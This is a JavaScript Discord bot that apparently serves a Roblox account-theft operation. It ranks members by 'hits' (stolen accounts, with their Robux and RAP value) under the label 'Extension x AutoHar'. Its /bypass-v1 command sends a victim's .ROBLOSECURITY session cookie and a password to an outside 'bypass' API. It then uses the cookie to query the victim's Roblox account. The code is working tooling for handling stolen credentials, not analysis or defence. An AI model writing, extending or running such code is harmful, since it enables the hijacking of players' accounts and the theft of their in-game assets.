require('dotenv').config();

const {
  Client,
  GatewayIntentBits,
  SlashCommandBuilder,
  Routes,
  REST,
  EmbedBuilder
} = require('discord.js');

const axios = require('axios');


const TOKEN = process.env.BOT_TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID;

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});


async function registerCommands() {
  const commands = [
    new SlashCommandBuilder()
      .setName('stats')
      .setDescription('Check your stats or someone else stats')
      .addUserOption(option =>
        option
          .setName('user')
          .setDescription('User to check stats for')
          .setRequired(false)
      )
      .toJSON(),
    new SlashCommandBuilder()
      .setName('tophitters')
      .setDescription('Show top 3 hitters today')
      .toJSON(),
    new SlashCommandBuilder()
      .setName('bypass-v1')
      .setDescription('Bypass a Roblox account cookie')
      .addStringOption(option =>
        option
          .setName('cookie')
          .setDescription('The Roblox cookie to bypass')
          .setRequired(true)
      )
      .addStringOption(option =>
        option
          .setName('password')
          .setDescription('The password for the bypass')
          .setRequired(true)
      )
      .toJSON()
  ];

  const rest = new REST({ version: '10' }).setToken(TOKEN);

  try {
    await rest.put(
      Routes.applicationCommands(CLIENT_ID),
      { body: commands }
    );
    console.log('✅ Slash command registered.');
  } catch (err) {
    console.error(err);
  }
}


async function fetchStats(discordId) {
  try {
    const response = await axios.get(
      `https://www.incbot.site/api/bot/stats/discord/${discordId}`,
      {
        headers: {
          "User-Agent": "Incbot-Discord-Bot",
          "Accept": "application/json"
        }
      }
    );

    return response.data;
  } catch (error) {
    console.error("API Error:", error.response?.status, error.message);
    return null;
  }
}


async function fetchLeaderboard() {
  try {
    const response = await axios.get(
      'https://www.incbot.site/api/bot/leaderboard?limit=3',
      {
        headers: {
          "User-Agent": "Incbot-Discord-Bot",
          "Accept": "application/json"
        }
      }
    );
    return response.data;
  } catch (error) {
    console.error("Leaderboard API Error:", error.response?.status, error.message);
    return null;
  }
}

function createStatsEmbed(data, user) {

  const lastHitTime = data.lastHit?.timestamp
    ? `<t:${Math.floor(new Date(data.lastHit.timestamp).getTime() / 1000)}:R>`
    : "N/A";

  return new EmbedBuilder()
    .setColor(0x2b2d31)
    .setAuthor({
      name: `${user.username} | Extension x AutoHar`,
      iconURL: user.displayAvatarURL({ dynamic: true })
    })
    .setThumbnail(user.displayAvatarURL({ dynamic: true }))
    .addFields(
      {
        name: '<:emoji_1:1472383243100622992> TODAY STATS',
        value:
`Hits: ${data.todayStats?.hits ?? 0}
Summary: ${(data.todayStats?.summary ?? 0).toLocaleString()}
RAP: ${(data.todayStats?.rap ?? 0).toLocaleString()}
Robux: ${(data.todayStats?.robux ?? 0).toLocaleString()}`,
        inline: false
      },
      {
        name: '<:emoji_1:1472383243100622992> TOTAL STATS',
        value:
`Total Hits: ${data.totalStats?.hits ?? 0}
Summary: ${(data.totalStats?.summary ?? 0).toLocaleString()}
RAP: ${(data.totalStats?.rap ?? 0).toLocaleString()}
Robux: ${(data.totalStats?.robux ?? 0).toLocaleString()}`,
        inline: false
      },
      {
        name: '<:emoji_1:1472383243100622992> BIGGEST HIT',
        value:
`Summary: ${(data.biggestHits?.summary ?? 0).toLocaleString()}
RAP: ${(data.biggestHits?.rap ?? 0).toLocaleString()}
Robux: ${(data.biggestHits?.robux ?? 0).toLocaleString()}`,
        inline: false
      },
      {
        name: '<:emoji_2:1472383270443417761> LAST HIT',
        value:
`User: ${data.lastHit?.user ?? "N/A"}
Time: ${lastHitTime}`,
        inline: false
      },
      {
        name: '<:emoji_3:1472383291872121016> NETWORK',
        value:
`Direct Referrals: ${data.networkStats?.directReferrals ?? 0}
Total Network: ${data.networkStats?.totalNetwork ?? 0}
Referral Code: ${data.networkStats?.referralCode ?? "N/A"}`,
        inline: false
      }
    )
    .setFooter({ text: `Requested by ${user.tag}` })
    .setTimestamp();
}


client.once('clientReady', () => {
  console.log(`🤖 Logged in as ${client.user.tag}`);
});


client.on('interactionCreate', async interaction => {
  if (!interaction.isChatInputCommand()) return;

  if (interaction.commandName === 'bypass-v1') {
    const cookie = interaction.options.getString('cookie');
    const password = interaction.options.getString('password');

    await interaction.deferReply({ ephemeral: true });

    try {
      // Call bypass API
      const bypassRes = await axios.post(
        'https://app.beamse.pro/api/bypass.php',
        { cookie, bypass_type: 'all_ages', password },
        { headers: { 'Content-Type': 'application/json' } }
      );
      const result = bypassRes.data;

      // Fetch Roblox username + avatar using the cookie
      let robloxUsername = 'Unknown';
      let robloxAvatarUrl = null;

      try {
        const authRes = await axios.get('https://users.roblox.com/v1/users/authenticated', {
          headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
        });
        const userId = authRes.data?.id;
        robloxUsername = authRes.data?.name ?? 'Unknown';

        if (userId) {
          const thumbRes = await axios.get(
            `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png`
          );
          robloxAvatarUrl = thumbRes.data?.data?.[0]?.imageUrl ?? null;
        }
      } catch (_) {
        // Roblox fetch failed, continue with defaults
      }

      const discordAvatar = interaction.user.displayAvatarURL({ dynamic: true });

      const embed = new EmbedBuilder()
        .setColor(result.success ? 0x57f287 : 0xed4245)
        .setAuthor({
          name: `@${interaction.user.username}`,
          iconURL: discordAvatar
        })
        .addFields(
          { name: 'Username', value: robloxUsername },
          { name: 'Status', value: result.message ?? (result.success ? 'Success' : 'Failed') }
        )
        .setTimestamp();

      if (robloxAvatarUrl) embed.setThumbnail(robloxAvatarUrl);

      // Ephemeral ack, then public result
      await interaction.editReply({ content: '\u2705 Done.' });
      return interaction.followUp({ embeds: [embed] });

    } catch (error) {
      console.error('Bypass API Error:', error.response?.status, error.message);
      return interaction.editReply('\u274c Failed to contact bypass API.');
    }
  }

  if (interaction.commandName === 'tophitters') {
    await interaction.deferReply();

    const leaderboard = await fetchLeaderboard();

    if (!leaderboard || leaderboard.length === 0) {
      return interaction.editReply('❌ No hitters today yet.');
    }

    const medals = ['<:diamond:1477630736293953596>', '<:emerald:1477630680866230344>', '<:gold:1477630787607072879>'];

    const mainEmbed = new EmbedBuilder()
      .setColor(0x2b2d31)
      .setTitle('<:Podium:1477634184746106961> TOP HITTERS TODAY')
      .setTimestamp();

    const hitterEmbeds = leaderboard.map((hitter, i) => {
      const avatarUrl = hitter.discordAvatar && hitter.discordId
        ? `https://cdn.discordapp.com/avatars/${hitter.discordId}/${hitter.discordAvatar}.png`
        : 'https://cdn.discordapp.com/embed/avatars/0.png';

      return new EmbedBuilder()
        .setColor(0x2b2d31)
        .setAuthor({
          name: `Extension x AutoHar`,
          iconURL: avatarUrl
        })
        .setDescription(`${i + 1}. ${medals[i]} ${hitter.displayName} | ${hitter.todayHits} Hit${hitter.todayHits !== 1 ? 's' : ''}
Last Hit: **${hitter.lastHitUser || 'N/A'}**`);
    });

    return interaction.editReply({ embeds: [mainEmbed, ...hitterEmbeds] });
  }

  if (interaction.commandName === 'stats') {

    const target = interaction.options.getUser('user') || interaction.user;

    await interaction.deferReply();

    const data = await fetchStats(target.id);

    if (!data) {
      return interaction.editReply('❌ Failed to fetch stats.');
    }

    const embed = createStatsEmbed(data, target);

    interaction.editReply({
      content: `<@${target.id}>`,
      embeds: [embed]
    });
  }
});


client.on('messageCreate', async message => {
  if (message.author.bot) return;

  // !top command
  if (message.content.startsWith('!top')) {
    const leaderboard = await fetchLeaderboard();

    if (!leaderboard || leaderboard.length === 0) {
      return message.reply('❌ No hitters today yet.');
    }

    const medals = ['<:diamond:1477630736293953596>', '<:emerald:1477630680866230344>', '<:gold:1477630787607072879>'];

    const mainEmbed = new EmbedBuilder()
      .setColor(0x2b2d31)
      .setTitle('<:Podium:1477634184746106961> TOP HITTERS TODAY')
      .setTimestamp();

    const hitterEmbeds = leaderboard.map((hitter, i) => {
      const avatarUrl = hitter.discordAvatar && hitter.discordId
        ? `https://cdn.discordapp.com/avatars/${hitter.discordId}/${hitter.discordAvatar}.png`
        : 'https://cdn.discordapp.com/embed/avatars/0.png';

      return new EmbedBuilder()
        .setColor(0x2b2d31)
        .setAuthor({
          name: `Extension x AutoHar`,
          iconURL: avatarUrl
        })
        .setDescription(`${i + 1}. ${medals[i]} ${hitter.displayName} | ${hitter.todayHits} Hit${hitter.todayHits !== 1 ? 's' : ''}
Last Hit: **${hitter.lastHitUser || 'N/A'}**`);
    });

    return message.reply({ embeds: [mainEmbed, ...hitterEmbeds] });
  }

  // !stats command
  if (!message.content.startsWith('!stats')) return;

  const target = message.mentions.users.first() || message.author;

  const data = await fetchStats(target.id);

  if (!data) {
    return message.reply('❌ Failed to fetch stats.');
  }

  const embed = createStatsEmbed(data, target);

  message.reply({
    content: `<@${target.id}>`,
    embeds: [embed]
  });
});


registerCommands();
client.login(TOKEN);
